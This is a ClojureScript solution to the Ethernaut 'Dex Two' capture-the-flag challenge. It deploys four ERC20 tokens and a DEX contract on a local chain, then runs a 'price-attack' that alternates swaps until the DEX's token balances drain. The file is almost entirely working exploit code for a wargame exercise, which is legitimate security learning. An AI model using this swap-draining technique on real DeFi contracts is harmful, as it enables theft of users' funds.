(ns ctf.ethernaut.dex-two
  "This solution uses the same logic as the DEX contract (previous challenge).
  It just deploys 4 ERC20 contract (instead of 2 in DEX).
  Lets call them A, B, C & D.

  Then it repeatedly swaps A->C and C->A
  until Dex's balance for A becomes 0.

  Similarly do it for B->D and D->A."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-dex-two!
  "Deploys the Dex contract using the local wallet!
   Returns the `js/Promise`."
  [token1-addr token2-addr]
  (let [contract (u/contract
                  :dex-two
                  w/local-wallet)]
    (.deploy contract
             token1-addr
             token2-addr)))


(defn deploy-swappable-token-two!
  "Deploys the Swappable ERC20 Token contract using local wallet!
   Returns the `js/Promise`."
  [name sym initial-supply]
  (let [contract (u/contract
                  :dex-two/swappable-token-two
                  w/local-wallet)]
    (.deploy contract
             name
             sym
             initial-supply)))


(defn swap
  [dex from-contract to-contract]
  (a/go-loop
      [from-contract     from-contract
       to-contract       to-contract]
    (let [dex-from-balance  (<p! (.balanceOf from-contract (.-address dex)))
          dex-to-balance    (<p! (.balanceOf to-contract (.-address dex)))
          player-balance    (<p! (.balanceOf from-contract (.-address player)))
          amount            (u/big-min dex-from-balance player-balance)]
      (prn "CURRENT STATE"
           dex-from-balance,
           dex-to-balance,
           player-balance
           amount)
      ;; DEX balances for both tokens should be positive
      ;; for executing the next swap.
      (when (and (.gt dex-from-balance (u/big-num 0))
                 (.gt dex-to-balance (u/big-num 0)))
        (do
          (<p!
           (.approve
            (.connect from-contract player)
            (.-address dex)
            amount))
          (<p!
           (.swap
            (.connect dex player)
            (.-address from-contract)
            (.-address to-contract)
            amount))
          ;; Change the direction of the Swap (from->to, to->from)
          (recur
           to-contract
           from-contract))))))


(defn price-attack
  []
  (try-async
   [token-a (<p!
             (deploy-swappable-token-two!
              "TokenA"
              "TOKA"
              1000))
    token-b (<p!
             (deploy-swappable-token-two!
              "TokenB"
              "TOKB"
              1000))
    token-c (<p!
             (deploy-swappable-token-two!
              "TokenC"
              "TOKC"
              1000))

    token-d (<p!
             (deploy-swappable-token-two!
              "TokenD"
              "TOKD"
              1000))

    dex     (<p!
             (deploy-dex-two!
              (.-address token-a)
              (.-address token-b)))]
   (do
     ;; transfer 10 TOKA from local wallet to player
     (<p!
      (.transfer
       token-a
       (.-address player)
       10))

     ;; transfer 100 TOKA from local wallet to dex
     (<p!
      (.transfer
       token-a
       (.-address dex)
       100))


     (<p!
      (.transfer
       token-b
       (.-address player)
       10))

     ;; transfer 100 TOKB from local wallet to dex
     (<p!
      (.transfer
       token-b
       (.-address dex)
       100))

     ;; transfer 10 TOKC from local wallet to player
     (<p!
      (.transfer
       token-c
       (.-address player)
       10))

     ;; transfer 100 TOKC from local wallet to dex
     (<p!
      (.transfer
       token-c
       (.-address dex)
       100))

     ;; transfer 10 TOKD from local wallet to player
     (<p! (.transfer
           token-d
           (.-address player)
           10))

     ;; transfer 100 TOKD from local wallet to dex
     (<p!
      (.transfer
       token-d
       (.-address dex)
       100))

     ;; Use the dex1 attack between A and C
     (<! (swap dex token-a token-c))
     (<! (swap dex token-b token-d)))))



(comment

  ;; execute this code to start the price attack
  (a/take!
   (price-attack)
   #(prn %))

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))



  )
